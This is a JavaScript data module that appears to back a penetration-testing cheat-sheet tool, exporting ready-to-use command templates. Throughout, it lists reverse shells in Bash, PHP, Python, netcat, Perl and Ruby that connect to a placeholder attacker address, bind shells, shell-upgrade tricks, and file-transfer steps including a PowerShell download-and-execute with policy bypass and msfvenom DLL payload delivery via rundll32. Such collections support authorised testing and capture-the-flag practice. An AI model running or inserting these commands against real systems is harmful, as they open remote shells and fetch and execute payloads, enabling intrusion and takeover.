export const reverse = [
  {
    name: "Bash",
    value: "bash -i >& /dev/tcp/MYIP/MYPORT 0>&1",
  },
  {
    name: "PHP",
    value: `php -r '$sock=fsockopen("MYIP",MYPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "Python",
    value: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MYIP",MYPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
  },
  {
    name: "NC v1",
    value: `nc -e /bin/sh MYIP MYPORT`,
  },
  {
    name: "NC v2",
    value: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MYIP MYPORT >/tmp/f`,
  },
  {
    name: "Perl",
    value: `perl -e 'use Socket;$i="MYIP";$p=MYPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    name: "Ruby",
    value: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
];
export const bind = [
  {
    name: "Python",
    value: `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",MYPORT));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`,
  },
  {
    name: "PHP",
    value: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",MYPORT);\
      socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
      $in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
          socket_write($cl,$m,strlen($m));}}'`,
  },
  {
    name: "Ruby",
    value: `ruby -rsocket -e 'f=TCPServer.new(MYPORT);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'`,
  },
  {
    name: "Netcat",
    value: `nc -nlvp MYPORT -e /bin/bash`,
  },
  {
    name: "Netcat OpenBSD",
    value: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp MYPORT >/tmp/f`,
  },
];
export const upgrade = [
  {
    name: "Python 2",
    value: `python -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    name: "Python 3",
    value: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    name: "Bash",
    value: `echo os.system('/bin/bash')`,
  },
  {
    name: "Perl",
    value: `perl -e 'exec "/bin/bash";'`,
  },
];

export const stable = [
  {
    name: "Fix Output",
    value: `stty raw -echo`,
  },
  {
    name: "Get Window Size",
    value: `stty size`,
  },
  {
    name: "Fix Window Size",
    value: `stty rows X cols Y`,
  },
];

export const transfer = [
  {
    name: "Python HTTP Server",
    steps: [
      {
        name: "Python2",
        value: "python -m SimpleHTTPServer MYPORT",
      },
      {
        name: "Python3",
        value: "python -m http.server MYPORT",
      },
    ],
  },
  {
    name: "Python FTP Server",
    steps: [
      {
        name: "Local ftp server",
        value: "python -m pyftpdlib",
      },
    ],
  },
  {
    name: "Netcat",
    steps: [
      {
        name: "Receiving end",
        value: "nc -lnvp MYPORT > file",
      },
      {
        name: "Sending end",
        value: "nc -w 3 10.10.10.10 MYPORT < file",
      },
    ],
  },
  {
    name: "Powershell",
    steps: [
      {
        name: "from HTTP",
        value: `powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"`,
      },
      {
        name: "from SMBServer",
        value: `powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1`,
      },
    ],
  },
  {
    name: "Rundll32",
    steps: [
      {
        name: "Generate payload",
        value: `msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=MYPORT -f dll > payload.dll`,
      },
      {
        name: "Delievery using SMB",
        value: `rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint`,
      },
    ],
  },
];
